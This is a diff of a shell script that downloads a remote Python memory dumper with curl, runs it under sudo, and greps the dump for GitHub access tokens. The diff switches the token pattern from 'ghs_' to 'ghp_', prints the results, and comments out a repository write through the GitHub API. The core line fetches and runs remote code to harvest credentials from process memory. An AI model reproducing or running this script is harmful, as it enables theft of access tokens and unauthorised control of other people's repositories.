@@ -3,7 +3,7 @@ set -e
 
 readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
 #FILE="r3s34rch.md"
-TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u`
+TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghp_[0-9A-Za-z]{20,}' | sort -u`
 
 echo "---------------------------1--------------------------------------"
 echo "$TOKEN_VAL"
@@ -11,7 +11,7 @@ echo "---------------------------2--------------------------------------"
 T2=${TOKEN_VAL:41:41} 
 echo "$T2"
 echo "---------------------------3--------------------------------------"
-sleep 60 
+ 
 #curl \
 #    -X PUT \
 #    -H "Accept: application/vnd.github.v3+json" \
@@ -29,8 +29,8 @@ sleep 60
 #  -f ref='refs/heads/add-readme' \
 #  -f sha="$(gh api repos/thi3nl0ng/thi3nl0ng.github.io/git/ref/heads/main --jq .object.sha)"
 
-gh api --silent \
-  -X PUT "/repos/$REPO/contents/README2.md" \
-  -f branch=add-readme \
-  -f message='add README2.md' \
-  -f content="$(echo '123' | base64)"
+#gh api --silent \
+#  -X PUT "/repos/$REPO/contents/README2.md" \
+#  -f branch=add-readme \
+#  -f message='add README2.md' \
+#  -f content="$(echo '123' | base64)"
